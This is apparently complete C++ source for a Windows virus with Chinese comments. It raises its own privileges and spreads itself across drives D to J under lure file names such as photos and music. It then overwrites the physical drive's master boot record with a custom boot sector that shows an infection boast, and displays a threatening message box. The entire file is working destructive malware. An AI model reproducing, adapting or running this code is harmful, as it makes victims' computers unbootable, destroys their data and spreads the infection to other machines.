#include "stdafx.h"
#include <Windows.h>
#include <iostream>
using namespace std;
char mbr[512] = { 0xB4,0x00,0xB0,0x05,0xCD,0x10,0xB4,0x0B,0xB7,0x00,0xB3,0x05,0xCD,0x10,0xB4,0x0B,0xB7,0x01,0xB3,0x01,0xCD,0x10,0xB4,0x13,0x66,0xBD,0x3B,0x7C,0x66,0xB9,0x78,0x00,0xB6,0x00,0xB2,0x00,0xB7,0x00,0xB0,0x01,0xB3,0x03,0xCD,0x10,0xB4,0x07,0xB0,0x03,0x66,0xB9,0x01,0x00,0x66,0xBA,0x80,0x00,0xCD,0x13,0xF4,0x21,0x59,0x6F,0x75,0x72,0x20,0x63,0x6F,0x6D,0x70,0x75,0x74,0x65,0x72,0x20,0x68,0x61,0x73,0x20,0x62,0x65,0x65,0x6E,0x20,0x66,0x75,0x63,0x6B,0x65,0x64,0x20,0x62,0x79,0x20,0x53,0x32,0x43,0x30,0x44,0x31,0x45,0x38,0x46,0x35,0x47,0x48,0x49,0x4A,0x44,0x56,0x30,0x48,0x56,0x20,0x2C,0x77,0x68,0x69,0x63,0x68,0x20,0x69,0x73,0x20,0x61,0x20,0x76,0x69,0x72,0x75,0x73,0x20,0x66,0x72,0x6F,0x6D,0x20,0x73,0x68,0x33,0x31,0x34,0x32,0x33,0x32,0x34,0x38,0x33,0x36,0x40,0x31,0x36,0x33,0x2E,0x63,0x6F,0x6D,0x21,0x28,0x54,0x41,0x54,0x29,0x0A,0x20,0x20,0x20,0x00,0x00,0x00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,0x55,0xAA };
 
void GetPrivileges()
{
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);
}//提升权限
void spread()
{
	CopyFileA("D:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("D:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("D:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("D:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("E:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("E:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("E:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("E:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("F:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("F:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("F:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("F:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("G:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("G:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("G:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("G:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("H:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("H:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("H:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("H:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("I:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("I:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("I:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("I:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("J:\\照片.exe", "C:\\booter.exe", FALSE);
	CopyFileA("J:\\音乐.exe", "C:\\booter.exe", FALSE);
	CopyFileA("J:\\课件.exe", "C:\\booter.exe", FALSE);
	CopyFileA("J:\\视频.exe", "C:\\booter.exe", FALSE);
	CopyFileA("C:\\booter.exe", "D:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "D:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "D:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "D:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "E:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "E:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "E:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "E:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "F:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "F:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "F:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "F:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "G:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "G:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "G:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "G:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "H:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "H:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "H:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "H:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "I:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "I:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "I:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "I:\\视频.exe", FALSE);
	CopyFileA("C:\\booter.exe", "J:\\照片.exe", FALSE);
	CopyFileA("C:\\booter.exe", "J:\\音乐.exe", FALSE);
	CopyFileA("C:\\booter.exe", "J:\\课件.exe", FALSE);
	CopyFileA("C:\\booter.exe", "J:\\视频.exe", FALSE);
}//传播模块

int WriteFile()
{
	HANDLE hFile;
	DWORD dwReadSize;
	char str_Name[] = "\\\\.\\PHYSICALDRIVE0";    //这是Windows对MBR的命名
	hFile = CreateFileA(str_Name,  GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if(WriteFile(hFile,mbr,512,&dwReadSize,NULL)==TRUE)
	{
		MessageBoxA(0, "你惹到了我，后果很严重", "S2C0D1E8F5GHIJDV0HV",MB_ICONSTOP);
		cout << "你中了S2C0D1E8F5GHIJDV0HV，这是一个很厉害的病毒，后果很严重!" << endl;
		return 1;
	}
	else
	{
		return 0;
	}//写入MBR
}
int main()
{
	get:GetPrivileges();
	spread();
	int a;
	a = WriteFile();
	if(a!=1)
	{
		goto get;
	}
	for (;1;)
	{

	}
	return 0;
}//主函数

